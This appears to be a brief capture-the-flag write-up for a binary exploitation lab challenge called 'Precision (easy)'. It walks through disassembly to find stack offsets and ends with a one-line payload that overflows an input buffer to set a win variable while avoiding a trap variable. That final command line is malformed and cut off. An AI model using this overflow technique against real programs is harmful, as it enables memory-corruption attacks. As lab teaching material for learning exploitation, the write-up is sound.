# Precision (easy)

#### Disassemble main there's a call to <challenge>:
```asm
0x0000000000401bd5 <+144>:   call   0x401645 <challenge>
```
------------------------------------------------------------

#### After disassembling challenge there is the input register value thats called later, 0x30 (48). The trap is set just before win 0x14 (20). The <win> loads 0x18 (24) to test.
```asm
; Load input
0x000000000040166b <+38>:    movq   $0x0,-0x30(%rbp)

; Call
0x0000000000401950 <+779>:   lea    -0x30(%rbp),%rax
0x0000000000401954 <+783>:   mov    %rax,%rsi
0x0000000000401957 <+786>:   mov    $0x0,%edi
0x000000000040195c <+791>:   call   0x401160 <read@plt>

; Trap
0x0000000000401af0 <+1195>:  mov    -0x14(%rbp),%eax
0x0000000000401af3 <+1198>:  test   %eax,%eax
0x0000000000401af5 <+1200>:  je     0x401b0d <challenge+1224>

; Win
0x0000000000401b0d <+1224>:  mov    -0x18(%rbp),%eax
0x0000000000401b10 <+1227>:  test   %eax,%eax
0x0000000000401b12 <+1229>:  je     0x401b1e <challenge+1241>
0x0000000000401b14 <+1231>:  mov    $0x0,%eax
0x0000000000401b19 <+1236>:  call   0x40153e <win>
```
--------------------------------------------------------

#### 48 - 24 is 24. But because the cutoff is 28, 24-27 would work. The cutoff is 28 because the input (48) - the trap (20) is 28.
```python3 -c "print('A' * 24) | /challenge/binary-exploitation-lose-variable-w```
